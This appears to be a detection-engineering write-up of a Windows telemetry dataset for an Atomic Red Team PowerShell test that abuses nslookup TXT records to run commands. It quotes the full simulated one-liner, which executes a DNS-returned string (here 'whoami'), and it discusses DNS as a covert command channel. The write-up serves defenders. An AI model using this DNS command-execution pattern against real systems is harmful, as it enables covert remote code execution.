# T1059.001-20: PowerShell — Abuse Nslookup with DNS Records

## Technique Context

T1059.001 covers PowerShell execution as a sub-technique of Command and Scripting Interpreter. This specific test (ART T1059.001-20) demonstrates abusing nslookup with DNS records, a technique where attackers can use DNS queries as a communication channel or to execute commands by parsing DNS responses. The technique is particularly interesting because it shows how legitimate network utilities can be subverted for malicious purposes.

The detection community typically focuses on unusual nslookup usage patterns, command-line arguments that suggest automation, and the combination of DNS queries with subsequent command execution. This technique can be used for data exfiltration, command and control communications, or as demonstrated here, command execution based on DNS response parsing.

## What This Dataset Contains

The dataset captures a PowerShell-based simulation that creates a custom nslookup function to demonstrate the technique concept. The key evidence appears in Security event 4688, which shows the PowerShell command line:

`"powershell.exe" & {# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"# this would not be part of a real attack but helpful for this simulationfunction nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}`

This command creates a PowerShell function that mimics nslookup but returns "whoami" as output, then executes that result. The execution chain shows:
- Parent PowerShell process (PID 42356) launching child PowerShell (PID 41232)
- Child PowerShell executing whoami.exe (PID 42488) captured in both Security 4688 and Sysmon 1
- The child PowerShell exits with status 0xC0000022 (STATUS_ACCESS_DENIED), indicating Windows Defender blocked some aspect of the execution

Sysmon captures the whoami.exe process creation (EID 1) with rule name "technique_id=T1033,technique_name=System Owner/User Discovery" and extensive .NET runtime loading events showing PowerShell initialization. A notable Sysmon event 10 shows process access from PowerShell to whoami.exe with full access rights (0x1FFFFF).

## What This Dataset Does Not Contain

The dataset lacks actual network DNS queries because this is a simulation that redirects nslookup output rather than performing real DNS lookups. There are no Sysmon DNS query events (EID 22) showing actual nslookup.exe execution, which would be expected in a real-world implementation of this technique. The PowerShell script block logging primarily contains framework boilerplate rather than the malicious command content itself.

The technique simulation also doesn't demonstrate the full attack potential - real implementations might parse TXT records containing encoded commands or use DNS as a covert channel, which would generate different telemetry patterns including actual network traffic and DNS resolution events.

## Assessment

This dataset provides moderate value for detection engineering focused on PowerShell command execution patterns and process relationships. The Security event logs with command-line logging capture the complete attack chain clearly, showing both the PowerShell wrapper technique and the eventual command execution. The Sysmon process creation and process access events add valuable context about the execution flow.

However, the dataset's utility is limited by its simulation nature - it doesn't demonstrate actual DNS abuse or nslookup execution, which are core components of the technique in real attacks. The lack of network telemetry and actual DNS events reduces its effectiveness for building comprehensive detections of DNS-based command execution techniques.

## Detection Opportunities Present in This Data

1. **PowerShell Command Line Analysis** - Security 4688 events containing complex PowerShell one-liners that redefine system utilities like nslookup, especially when combined with command execution patterns like `.(function_call)[-1]`

2. **Nested PowerShell Process Creation** - Security 4688 showing PowerShell spawning child PowerShell processes with suspicious command lines containing function redefinition and immediate execution

3. **PowerShell to System Utility Execution Chain** - Process creation chains where PowerShell spawns reconnaissance tools like whoami.exe, particularly when the PowerShell command line suggests DNS-related activity

4. **Process Access from PowerShell** - Sysmon EID 10 events showing PowerShell processes accessing recently spawned child processes with full access rights, indicating potential process manipulation

5. **PowerShell Function Redefinition Patterns** - Command lines containing `function nslookup` or similar system utility redefinitions combined with immediate invocation and array indexing operations

6. **Blocked PowerShell Execution** - Security 4689 events showing PowerShell processes exiting with STATUS_ACCESS_DENIED (0xC0000022), indicating endpoint protection intervention during suspicious PowerShell activity
